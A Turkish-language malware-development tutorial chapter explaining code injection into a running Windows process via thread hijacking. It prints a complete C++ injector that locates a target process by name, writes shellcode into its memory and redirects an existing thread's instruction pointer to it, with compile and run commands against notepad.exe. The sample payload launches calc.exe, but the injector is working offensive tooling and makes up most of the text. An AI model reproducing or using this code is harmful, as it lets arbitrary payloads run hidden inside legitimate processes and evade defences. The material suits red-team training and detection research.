\newpage
\subsection{16. Thread hijacking ile kod enjeksiyonu. Basit C++ zararlı yazılım.}

﷽

![thread hijacking](./images/24/2021-11-23_21-51.png){width="80%"}    

### bu ne anlama geliyor?

Bugün, uzaktaki bir sürece thread hijacking (iş parçacığı ele geçirme) yöntemiyle kod enjeksiyonunu anlatacağım. Bu, yeni bir uzak iş parçacığı oluşturmak yerine mevcut iş parçacıklarını ele geçirerek kod enjekte etmeyi içerir. Kod enjeksiyonu yöntemlerinden biri, bir yürütülebilir kod konumunda başka bir süreçten bir iş parçacığı oluşturmak için `CreateRemoteThread` kullanmaktır, bunu daha önce [yazmıştım](https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html). Veya örneğin, `CreateRemoteThread` ile `LoadLibrary` işlevini çalıştırarak ve `CreateRemoteThread` içinde bir argüman geçirerek klasik DLL enjeksiyonu yapılabilir. Bu [teknik](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html) hakkındaki yazımı bulabilirsiniz.

### Örnek

Bu tekniği gösteren bir örneğe bakalım:     

```cpp
/*
hack.cpp
code injection via thread hijacking
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/11/23/malware-injection-6.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 
  0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 
  0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 
  0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 
  0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 
  0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
  0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 
  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 
  0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 
  0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 
  0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 
  0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 
  0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 
  0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 
  0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 
  0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 
  0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 
  0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 
  0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 
  0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 
  0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 
  0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

unsigned int my_payload_len = sizeof(my_payload);

// get process PID
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

int main(int argc, char* argv[]) {
  DWORD pid = 0; // process ID
  HANDLE ph; // process handle
  HANDLE ht; // thread handle
  LPVOID rb; // remote buffer

  HANDLE hSnapshot;
  THREADENTRY32 te;
  CONTEXT ct;

  pid = findMyProc(argv[1]);
  if (pid == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  } else {
    printf("PID = %d\n", pid);

    ct.ContextFlags = CONTEXT_FULL;
    te.dwSize = sizeof(THREADENTRY32);

    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

    if (ph == NULL) {
      printf("OpenProcess failed! exiting...\n");
      return -2;
    }

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, my_payload_len,
    MEM_RESERVE | MEM_COMMIT, 
    PAGE_EXECUTE_READWRITE);

    // write payload to memory buffer
    WriteProcessMemory(ph, rb, my_payload, 
    my_payload_len, NULL);

    // find thread ID for hijacking
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (Thread32First(hSnapshot, &te)) {
      do {
        if (pid == te.th32OwnerProcessID) {
  	  ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
          break;
  	}
      } while (Thread32Next(hSnapshot, &te));
    }

    // suspend target thread
    SuspendThread(ht);
    GetThreadContext(ht, &ct);
    // update register (RIP)
    ct.Rip = (DWORD_PTR)rb;
    SetThreadContext(ht, &ct);
    ResumeThread(ht);

    CloseHandle(ph);
  }
  return 0;
}
```

Her zamanki gibi, basitlik adına payload olarak 64-bit `calc.exe` kullanıyoruz. 

Gördüğünüz gibi,süreçleri isimle bulmak için [önceki](https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html) yazımdan bir işlev olan `findMyProc` işlevini kullandım. Daha sonra, ana işlevim, [önceki](https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html) yazımdaki "klasik" uzak süreç kod enjeksiyonuna benzer. Tek fark, yeni bir iş parçacığı oluşturmak yerine mevcut bir iş parçacığını ele geçirmemizdir.

Bu tekniğin akışı şu şekilde:Öncelikle, hedef süreci buluyoruz:

![code injection 2](./images/24/2021-11-24_01-49.png){width="80%"}    

Daha sonra, her zamanki gibi hedef süreçte payload için alan tahsis ediyoruz:    

![code injection 3](./images/24/2021-11-24_01-52.png){width="80%"}    

payload'u tahsis edilen alana yazıyoruz:    

![code injection 3](./images/24/2021-11-24_01-53.png){width="80%"}    

Bir sonraki adımda, hedef süreçte ele geçirmek istediğimiz iş parçacığının ID’ni buluyoruz. Bizim durumumuzda, hedef sürecin ilk iş parçacığının kimliğini alacağız. Bunun için `CreateToolhelp32Snapshot` kullanarak hedef sürecin iş parçacıklarının bir anlık görüntüsünü oluşturuyoruz ve `Thread32Next` ile iş parçacıklarını sıralıyoruz. Bu bize ele geçireceğimiz iş parçacığının ID'ni verecek:     

![code injection 4](./images/24/2021-11-24_01-55.png){width="80%"}    

Daha sonra, ele geçirmek istediğimiz hedef iş parçacığını askıya alıyoruz:     

![code injection 5](./images/24/2021-11-24_01-58.png){width="80%"}    

Ardından, hedef iş parçacığının bağlamını alıyoruz:     

![code injection 6](./images/24/2021-11-24_02-01.png){width="80%"}    

Hedef iş parçacığının `RIP` (64-bit'teki komut işaretçisi) kaydını payload'a işaret edecek şekilde güncelliyoruz:     

![code injection 7](./images/24/2021-11-24_02-03.png){width="80%"}    

Ancak, burada "SetThreadContext anomaly" (SetThreadContext anomalisi) adı verilen bir sorun vardır. Bazı süreçler için, değişken kayıtlar (`RAX`, `RCX`, `RDX`, `R8-R11`) `SetThreadContext` ile ayarlanır, ancak diğer süreçler (örneğin Explorer, Edge) için göz ardı edilir. Bu kayıtları ayarlamak için `SetThreadContext`'e güvenmemek en iyisidir.     
Ele geçirilen iş parçacığını onaylıyoruz:    

![code injection 8](./images/24/2021-11-24_02-05.png){width="80%"}    

Ve bir sonraki adımda ele geçirilen iş parçacığını devam ettiriyoruz:     

![code injection 9](./images/24/2021-11-24_02-07.png){width="80%"}    

Gördüğünüz gibi, bu çok da zor değil. Şimdi bu zararlı yazılım kodunu derleyelim:     
```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive >/dev/null 2>&1
```

![code injection 10](./images/24/2021-11-24_02-18.png){width="80%"}    

Kurban makinede önce bir `notepad.exe` oturumu başlatalım ve ardından programımızı çalıştıralım:      

```powershell
.\hack.exe notepad.exe
```

![code injection 11](./images/24/2021-11-24_02-22.png){width="80%"}    

ve payload kodumuz, kurban süreci (`notepad.exe`) kapandıktan sonra bile çalışmaya devam ediyor:     

![code injection 12](./images/24/2021-11-24_02-29.png){width="80%"}    

Gördüğünüz gibi, mantığımız mükemmel bir şekilde çalıştı!    

[Thread execution hijacking](https://attack.mitre.org/techniques/T1055/003/)    
[CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)          
[Process32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)         
[Process32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)       
[strcmp](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp?view=msvc-160)         
[Taking a Snapchot and Viewing Processes](https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)         
[Thread32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first)    
[Thread32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next)    
[CloseHandle](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)        
[VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)   
[WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)      
[SuspendThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread)    
[GetThreadContext](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext)    
[SetThreadContext](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)    
[ResumeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)    
["Classic" code injection](https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html)    
["Classic" DLL injection](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html)    
[Github'taki kaynak kod:](https://github.com/cocomelonc/2021-11-23-malware-injection-6)    
